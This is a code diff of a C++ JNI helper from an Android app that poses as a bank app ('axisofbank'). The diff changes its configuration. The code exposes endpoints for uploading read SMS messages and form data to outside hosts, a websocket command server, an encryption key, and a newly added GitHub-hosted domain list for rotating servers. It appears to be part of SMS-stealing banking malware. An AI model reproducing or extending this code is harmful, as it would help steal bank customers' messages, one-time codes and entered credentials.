@@ -2,18 +2,19 @@
 #include <string>
 
 // Declare global variables for the domain URLs
-std::string url = "https://cloudqq.in/api";
 std::string sms_save = "/sms-reader/add";
 std::string form_save = "/form/add";
 std::string site = "localhost";
-std::string KEY = "00112233445566778899aabbccddeeff";
+std::string KEY = "001122334455667A8899aabbccddeeff";
 std::string getNumber = "/site/number?site=";
-std::string socket_url = "wss://socket.missyou9.in";
+
+std::string domainList = "https://dkb0ss2.github.io/checklist/checkMasterS4ve.html";
+
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_URL(JNIEnv *env, jobject thiz) {
-    return env->NewStringUTF(url.c_str());
+Java_com_axisofbank_german_Helper_DomainList(JNIEnv *env, jobject thiz) {
+    return env->NewStringUTF(domainList.c_str());
 }
 
 extern "C"
@@ -34,20 +35,16 @@ Java_com_axisofbank_german_Helper_SITE(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(site.c_str());
 }
 
+
 extern "C"
 JNIEXPORT jstring JNICALL
 Java_com_axisofbank_german_Helper_KEY(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(KEY.c_str());
 }
 
+
 extern "C"
 JNIEXPORT jstring JNICALL
 Java_com_axisofbank_german_Helper_getNumber(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(getNumber.c_str());
-}
-
-extern "C"
-JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_SocketUrl(JNIEnv *env, jobject thiz) {
-    return env->NewStringUTF(socket_url.c_str());
 }
